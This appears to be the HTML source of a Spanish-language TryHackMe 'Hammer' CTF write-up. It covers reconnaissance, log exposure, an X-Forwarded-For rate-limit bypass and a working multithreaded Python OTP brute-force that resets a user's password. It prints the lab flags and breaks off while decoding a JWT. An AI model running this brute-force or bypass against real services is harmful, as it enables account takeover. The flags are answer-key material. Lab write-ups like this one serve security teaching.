@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hammer — TryHackMe Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(0,232,122,0.08); color: var(--green); border: 1px solid rgba(0,232,122,0.2); }
+.tag-diff-medium { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.tag-diff-hard { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.tag-staff { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.hero-stats { display: flex; gap: 28px; flex-wrap: wrap; }
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; width: 260px; height: 260px; }
+.hero-orb canvas { display: block; width: 260px !important; height: 260px !important; }
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.code-compare,.lessons-grid{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);overflow-x:auto;}
+.cmd-line{font-size:.95rem;line-height:1.9;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;white-space:pre-wrap;word-break:break-word;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.danger-box{background:rgba(248,113,113,.05);border-left:3px solid var(--red);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.danger-box strong{color:var(--red);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.danger-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.vuln-grid{grid-template-columns:1fr;}}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-top:3px solid var(--red);border-radius:12px;padding:1.25rem;}
+.vuln-card h3{color:var(--red);margin-bottom:.5rem;font-size:.9rem;}
+.vuln-card p{font-size:.85rem;color:var(--text2);}
+.vuln-sev{display:inline-block;margin-top:.5rem;font-family:var(--mo);font-size:.65rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:3px 10px;border-radius:3px;background:rgba(248,113,113,.15);color:var(--red);border:1px solid rgba(248,113,113,.3);}
+.vuln-sev.crit{background:rgba(248,113,113,.25);color:#ff6b6b;border:1px solid rgba(248,113,113,.5);}
+.vuln-sev.med{background:rgba(251,146,60,.15);color:var(--orange);border:1px solid rgba(251,146,60,.3);}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+.flag-box.user{border-color:rgba(96,165,250,.3);}
+.flag-box.user .flag-value{color:var(--blue);background:rgba(96,165,250,.08);border-color:rgba(96,165,250,.2);}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.78rem;text-align:right;}
+.skill-bar{margin:.6rem 0;}
+.skill-bar-label{display:flex;justify-content:space-between;font-size:.75rem;color:var(--text2);margin-bottom:.25rem;font-family:var(--mo);}
+.skill-bar-track{background:var(--card2);height:6px;border-radius:3px;overflow:hidden;}
+.skill-bar-fill{background:linear-gradient(90deg,var(--green),var(--cyan));height:100%;border-radius:3px;}
+.tool-row{display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);}
+.tool-row:last-child{border-bottom:none;}
+.tool-name{color:var(--green);font-family:var(--mo);font-size:.75rem;min-width:80px;}
+.tool-desc{color:var(--text3);font-size:.72rem;}
+.toc-link{display:block;font-size:.78rem;color:var(--text2);padding:.3rem .55rem;border-radius:4px;border-left:2px solid var(--border);margin-bottom:.2rem;transition:all .2s;}
+.toc-link:hover{border-left-color:var(--green);color:var(--green);background:rgba(0,232,122,.05);}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;font-size:.76rem;}
+
+/* ASCII diagram */
+.ascii-diagram{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1.5rem;font-family:var(--mo);font-size:.78rem;color:var(--text2);overflow-x:auto;line-height:1.6;white-space:pre;margin:1rem 0;}
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">TryHackMe</span>
+        <span class="tag tag-category">Web App</span>
+        <span class="tag tag-diff-medium">Medium</span>
+        <span class="tag tag-os">Linux</span>
+      </div>
+      <h1><span>Hammer</span> — JWT kid Injection + OTP Brute</h1>
+      <p class="hero-sub">Cadena de ataque web completa: fuga de logs → bypass de rate limiting con X-Forwarded-For → fuerza bruta de OTP de 4 dígitos → forja de JWT mediante manipulación del parámetro <strong style="color:var(--green);">kid</strong> → escalada a admin → RCE como www-data.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Plataforma</span><span class="stat-value green">TryHackMe</span></div>
+        <div class="stat"><span class="stat-label">Dificultad</span><span class="stat-value">Medium</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
+        <div class="stat"><span class="stat-label">Flags</span><span class="stat-value green">2 / 2</span></div>
+      </div>
+    </div>
+    <div class="hero-orb"><canvas id="heroOrb"></canvas></div>
+  </div>
+</div>
+
+<!-- ═══ MAIN ═══ -->
+<div class="container">
+<main>
+
+<!-- FLAGS -->
+<div class="flag-box user">
+  <div class="flag-label">Flag 1 — Auth Bypass (Dashboard)</div>
+  <div class="flag-value">THM{AuthBypass3D}</div>
+</div>
+<div class="flag-box">
+  <div class="flag-label">Flag 2 — Remote Code Execution</div>
+  <div class="flag-value">THM{RUNANYCOMMAND1337}</div>
+</div>
+
+<!-- 00 RESUMEN -->
+<div class="section" id="resumen">
+  <h2>Resumen Ejecutivo</h2>
+  <div class="step-box">
+    <p>Hammer es una máquina Linux de dificultad media en TryHackMe orientada al ataque de aplicaciones web. El compromiso recorre tres vulnerabilidades independientes encadenadas: exposición de logs en un directorio público, bypass del rate limiting mediante la cabecera <code>X-Forwarded-For</code> para forzar un OTP de 4 dígitos, e inyección en el parámetro <code>kid</code> del JWT para forjar un token con role <code>admin</code> y obtener ejecución remota de comandos como <code>www-data</code>.</p>
+    <div class="why-box">
+      <strong>¿Por qué es interesante?</strong>
+      <p>Tres vulnerabilidades de impacto bajo–medio (log exposure, weak rate limit, JWT misconfig) se combinan en una cadena que termina en RCE. Refleja muy bien escenarios reales: ningún fallo aislado parece crítico, pero la suma compromete por completo la aplicación.</p>
+    </div>
+  </div>
+</div>
+
+<!-- 01 RECON -->
+<div class="section" id="recon">
+  <h2>1. Reconocimiento</h2>
+
+  <div class="step-box">
+    <div class="step-number">PASO 1 — Escaneo completo de puertos</div>
+    <h3>nmap -p- contra el target</h3>
+    <div class="why-box"><strong>¿Qué hacemos?</strong><p>Mapeamos toda la superficie de ataque visible desde la red. Sin saber qué servicios corren, no podemos planear nada.</p></div>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p- --open -n -T4 -sS</span> <span class="ip">10.128.167.188</span></div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-p-</code> escanea los 65535 puertos TCP</div>
+        <div class="cmd-note"><code>--open</code> muestra solo los abiertos</div>
+        <div class="cmd-note"><code>-sS</code> SYN scan — más sigiloso, no completa el handshake</div>
+        <div class="cmd-note"><code>-T4</code> agresividad media-alta</div>
+      </div>
+    </div>
+    <div class="output-label">output</div>
+    <div class="output-box">PORT     STATE SERVICE
+22/tcp   open  ssh
+1337/tcp open  waste</div>
+    <div class="interpret-box"><strong>Interpretación</strong><p>Solo dos puertos: SSH estándar y un servicio en el puerto no estándar 1337. Nmap lo etiqueta como "waste" porque no lo conoce. Necesitamos detección de versiones para confirmar qué corre ahí.</p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 2 — Detección de versiones</div>
+    <h3>nmap -sC -sV sobre los puertos abiertos</h3>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p22,1337 -sC -sV -n</span> <span class="ip">10.128.167.188</span></div></div>
+    <div class="output-label">output</div>
+    <div class="output-box">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
+1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Login
+| http-cookie-flags:
+|   PHPSESSID:
+|_    httponly flag not set   ← seguridad débil</div>
+    <div class="interpret-box"><strong>Hallazgos clave</strong><p>El puerto 1337 sirve una aplicación web PHP con Apache. La cookie <code>PHPSESSID</code> sin el flag <code>httponly</code> indica configuración descuidada. El título "Login" confirma que hay un panel de autenticación.</p></div>
+    <div class="decision-box"><strong>Decisión</strong><p>Toda la atención al puerto 1337. SSH no tiene credenciales conocidas todavía.</p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 3 — Análisis del HTML fuente</div>
+    <h3>Comentario revelador en la página de login</h3>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="param">http://10.128.167.188:1337/</span></div></div>
+    <div class="output-label">fragmento del HTML</div>
+    <div class="output-box">&lt;link href="/hmr_css/bootstrap.min.css" rel="stylesheet"&gt;
+&lt;!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --&gt;
+...
+&lt;a href="reset_password.php"&gt;Forgot your password?&lt;/a&gt;</div>
+    <div class="interpret-box"><strong>Pista de oro</strong><p>Un desarrollador dejó un comentario revelando la convención <code>hmr_*</code> para todos los directorios del servidor. Esto reduce drásticamente el espacio de búsqueda en la enumeración: en vez de probar miles de nombres genéricos, solo variamos el sufijo.</p></div>
+  </div>
+</div>
+
+<!-- 02 LOGS -->
+<div class="section" id="logs">
+  <h2>2. Fuga de información en logs</h2>
+
+  <div class="step-box">
+    <div class="step-number">PASO 4 — Enumeración de directorios hmr_*</div>
+    <h3>Fuerza bruta dirigida con prefijo conocido</h3>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">for</span> dir <span class="cmd">in</span> logs log hmr_logs hmr_js hmr_images hmr_backup hmr_config hmr_admin; <span class="cmd">do</span>
+  code=$(<span class="cmd">curl</span> <span class="flag-opt">-s -o</span> /dev/null <span class="flag-opt">-w</span> <span class="str-c">"%{http_code}"</span> <span class="param">http://10.128.167.188:1337/$dir/</span>)
+  [ <span class="str-c">"$code"</span> != <span class="str-c">"404"</span> ] &amp;&amp; <span class="cmd">echo</span> <span class="str-c">"$dir → $code"</span>
+<span class="cmd">done</span></div></div>
+    <div class="output-label">output</div>
+    <div class="output-box">hmr_logs   → 200
+hmr_js     → 200
+hmr_images → 200</div>
+    <div class="interpret-box"><strong>Hallazgo crítico</strong><p><code>hmr_logs/</code> devuelve 200 con directory listing habilitado. Podemos leer los logs del servidor sin autenticación.</p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 5 — Lectura de error.logs</div>
+    <h3>Extracción del email del usuario objetivo</h3>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="param">http://10.128.167.188:1337/hmr_logs/error.logs</span></div></div>
+    <div class="output-label">output — error.logs</div>
+    <div class="output-box">[Mon Aug 19 12:02:34] [authz_core:error] user tester@hammer.thm: authentication failure for "/restricted-area"
+[Mon Aug 19 12:05:07] [authz_core:error] client denied: /home/hammerthm/test.php
+[Mon Aug 19 12:06:18] [authz_core:error] user tester@hammer.thm: authentication failure for "/admin-login"</div>
+    <div class="interpret-box"><strong>¿Qué encontramos?</strong><p>Email real <strong>tester@hammer.thm</strong> y directorio home <code>/home/hammerthm/</code>. Suficiente para iniciar el flujo de reset de contraseña.</p></div>
+    <div class="danger-box"><strong>¿Por qué es vulnerabilidad?</strong><p>Los logs nunca deben ser accesibles públicamente. Contienen emails, rutas internas, IPs y patrones de uso aprovechables para phishing, brute force y enumeración de usuarios.</p></div>
+    <div class="decision-box"><strong>Decisión</strong><p>Usar <code>tester@hammer.thm</code> en <code>reset_password.php</code> para iniciar el flujo de OTP.</p></div>
+  </div>
+</div>
+
+<!-- 03 OTP BRUTE -->
+<div class="section" id="otp">
+  <h2>3. Brute force de OTP con bypass de rate limiting</h2>
+
+  <div class="step-box">
+    <div class="step-number">PASO 6 — Análisis del formulario</div>
+    <h3>OTP de 4 dígitos + cabecera Rate-Limit-Pending</h3>
+    <div class="why-box"><strong>¿Qué es un OTP?</strong><p>Una contraseña de un solo uso que se envía al usuario para verificar identidad. Si tiene pocos dígitos y el rate limit no es robusto, es forzable.</p></div>
+    <p>Al enviar el email al endpoint, la respuesta incluye una cabecera muy reveladora:</p>
+    <div class="output-label">headers HTTP</div>
+    <div class="output-box">HTTP/1.1 302 Found
+Set-Cookie: PHPSESSID=...; path=/
+Rate-Limit-Pending: 9
+Location: reset_password.php</div>
+    <div class="interpret-box"><strong>¿Qué significa?</strong><p>El servidor permite máximo 10 intentos por IP. Con 4 dígitos hay 10.000 combinaciones — imposible con 10 intentos. Pero la pregunta clave es: <em>¿cómo identifica el servidor la IP del cliente?</em></p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 7 — Bypass con X-Forwarded-For</div>
+    <h3>Test: ¿se resetea el contador con cada XFF distinto?</h3>
+    <div class="why-box"><strong>¿Qué es X-Forwarded-For?</strong><p>Cabecera HTTP usada por proxies para indicar al backend la IP original del cliente. Si el servidor confía en ella sin validar el origen, el atacante la falsifica trivialmente.</p></div>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">for</span> i <span class="cmd">in</span> $(<span class="cmd">seq</span> 1 12); <span class="cmd">do</span>
+  XFF=<span class="str-c">"10.0.0.$i"</span>
+  resp=$(<span class="cmd">curl</span> <span class="flag-opt">-s -i -b</span> <span class="str-c">"PHPSESSID=$SESS"</span> <span class="param">http://10.128.167.188:1337/reset_password.php</span> \
+    <span class="flag-opt">-X</span> POST <span class="flag-opt">-d</span> <span class="str-c">"recovery_code=000$i&amp;s=180"</span> \
+    <span class="flag-opt">-H</span> <span class="str-c">"X-Forwarded-For: $XFF"</span> | <span class="cmd">grep</span> <span class="str-c">"Rate-Limit"</span>)
+  <span class="cmd">echo</span> <span class="str-c">"Req $i (XFF=$XFF): $resp"</span>
+<span class="cmd">done</span></div></div>
+    <div class="output-label">output</div>
+    <div class="output-box">Req 1  (XFF=10.0.0.1):  Rate-Limit-Pending: 9
+Req 2  (XFF=10.0.0.2):  Rate-Limit-Pending: 9
+Req 3  (XFF=10.0.0.3):  Rate-Limit-Pending: 9
+...
+Req 12 (XFF=10.0.0.12): Rate-Limit-Pending: 9</div>
+    <div class="interpret-box"><strong>¡Rate limit completamente bypasseado!</strong><p>Cada IP nueva en XFF recibe contador fresco. Cambiando la IP en cada petición podemos lanzar 10.000 intentos sin restricción.</p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 8 — Brute force multithread del OTP</div>
+    <h3>50 hilos paralelos para entrar en la ventana de 180s</h3>
+    <div class="why-box"><strong>¿Por qué 50 hilos?</strong><p>El OTP expira en 180 segundos. Con un solo hilo no llegamos a tiempo. Con 50 hilos atacando rangos de 200 códigos, cubrimos las 10.000 combinaciones en ~20–30 segundos.</p></div>
+    <div class="cmd-annotated"><pre><span class="comment-c">#!/usr/bin/env python3</span>
+<span class="cmd">import</span> requests, random, threading
+
+TARGET = <span class="str-c">"http://10.128.167.188:1337/reset_password.php"</span>
+stop_flag = threading.Event()
+session = requests.Session()
+
+<span class="comment-c"># Activar el flujo de reset (1 sola vez, 1 sola sesión)</span>
+session.post(TARGET, data={<span class="str-c">"email"</span>: <span class="str-c">"tester@hammer.thm"</span>},
+             headers={<span class="str-c">"X-Forwarded-For"</span>: <span class="str-c">"1.1.1.1"</span>}, allow_redirects=False)
+
+<span class="cmd">def</span> brute_range(start, end):
+    <span class="cmd">for</span> code <span class="cmd">in</span> range(start, end):
+        <span class="cmd">if</span> stop_flag.is_set(): <span class="cmd">return</span>
+        otp = <span class="str-c">f"{code:04d}"</span>
+        <span class="comment-c"># IP aleatoria diferente en cada petición → bypass rate limit</span>
+        xff = <span class="str-c">f"127.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"</span>
+        r = session.post(TARGET,
+            data={<span class="str-c">"recovery_code"</span>: otp, <span class="str-c">"s"</span>: <span class="str-c">"180"</span>},
+            headers={<span class="str-c">"X-Forwarded-For"</span>: xff},
+            timeout=8, allow_redirects=False)
+        <span class="cmd">if</span> <span class="str-c">"Invalid or expired recovery code!"</span> <span class="cmd">not in</span> r.text \
+           <span class="cmd">and</span> <span class="str-c">"Enter Recovery Code"</span> <span class="cmd">not in</span> r.text:
+            stop_flag.set()
+            <span class="cmd">print</span>(<span class="str-c">f"[+] OTP ENCONTRADO: {otp}"</span>)
+            <span class="cmd">return</span>
+
+<span class="comment-c"># 50 threads, cada uno ataca 200 códigos</span>
+threads = [threading.Thread(target=brute_range, args=(i*200, (i+1)*200)) <span class="cmd">for</span> i <span class="cmd">in</span> range(50)]
+[t.start() <span class="cmd">for</span> t <span class="cmd">in</span> threads]
+[t.join() <span class="cmd">for</span> t <span class="cmd">in</span> threads]</pre></div>
+    <div class="output-label">output</div>
+    <div class="output-box">[*] Triggering reset...
+[+] Session: 7c338887u17unk2aqbt4ll3671
+
+[+] OTP ENCONTRADO: 3439
+[+] Pass change: 200 | OK</div>
+    <div class="interpret-box"><strong>Resultado</strong><p>OTP encontrado en segundos. Inmediatamente cambiamos la contraseña a <code>Password123!</code>. Ya tenemos credenciales válidas para <code>tester@hammer.thm</code>.</p></div>
+  </div>
+</div>
+
+<!-- 04 DASHBOARD -->
+<div class="section" id="dashboard">
+  <h2>4. Acceso al dashboard — Flag 1</h2>
+
+  <div class="step-box">
+    <div class="step-number">PASO 9 — Login con las nuevas credenciales</div>
+    <h3>Tres cookies y un JWT con kid sospechoso</h3>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s -L -c</span> cookies.txt <span class="param">http://10.128.167.188:1337/</span> \
+  <span class="flag-opt">-X</span> POST <span class="flag-opt">-d</span> <span class="str-c">"email=tester@hammer.thm&amp;password=Password123!"</span> <span class="flag-opt">-o</span> dashboard.html</div></div>
+    <div class="output-label">headers de respuesta</div>
+    <div class="output-box">HTTP/1.1 302 Found
+Set-Cookie: PHPSESSID=...; path=/
+Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9...
+Set-Cookie: persistentSession=no; Max-Age=20; path=/
+Location: dashboard.php</div>
+    <div class="interpret-box"><strong>Tres cookies críticas</strong><p>El JWT en <code>token</code> es lo más relevante. <code>persistentSession</code> dura solo 20 segundos — la app usa JS para redirigir a logout cuando expira, creando una ventana de trabajo estrecha.</p></div>
+    <div class="output-label">dashboard.php — contenido</div>
+    <div class="output-box">&lt;h3&gt;Welcome, Thor! - Flag: THM{AuthBypass3D}&lt;/h3&gt;
+&lt;p&gt;Your role: user&lt;/p&gt;
+&lt;input type="text" id="command" placeholder="Enter command"&gt;
+&lt;button id="submitCommand"&gt;Submit&lt;/button&gt;
+# AJAX call → execute_command.php con Bearer JWT en Authorization header</div>
+    <div class="decision-box"><strong>Flag 1 capturada</strong><p><strong>THM{AuthBypass3D}</strong>. Hay un campo de comandos pero el role actual es <code>user</code>. Hay que escalar a <code>admin</code> antes de poder ejecutar.</p></div>
+  </div>
+</div>
+
+<!-- 05 JWT -->
+<div class="section" id="jwt">
+  <h2>5. JWT kid Injection — Escalada a admin</h2>
+
+  <div class="step-box">
+    <div class="step-number">PASO 10 — Decodificar el JWT</div>
+    <h3>Análisis del parámetro kid</h3>
+    <div class="why-box"><strong>¿Qué es un JWT?</strong><p>Estándar para transmitir información firmada. Tres partes: <strong>header</strong> (tipo + algoritmo), <strong>payload</strong> (datos), <strong>signature</strong> (firma). Si la firma valida, el servidor confía en el payload.</p></div>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">echo</span> <span class="str-c">"eyJ0eXAiOi..."</span> | <span class="cmd">base64</span> <span class="flag-opt">-d</span></div></div>
+    <div class="output-label">JWT header decodificado</div>
+    <div class="output-box">{
+  "typ": "JWT",
+  "alg": "HS256",
+  "kid": "/var/www/mykey.key"
+}</div>
+    <div class="output-label">JWT payload decodificado</div>
+    <div class="output-box">{
+  "iss": "http://hammer.thm",
+  "aud": "http://hammer.thm",
+  "iat": 1776416845,
+  "exp": 1776420445,
+  "data": {
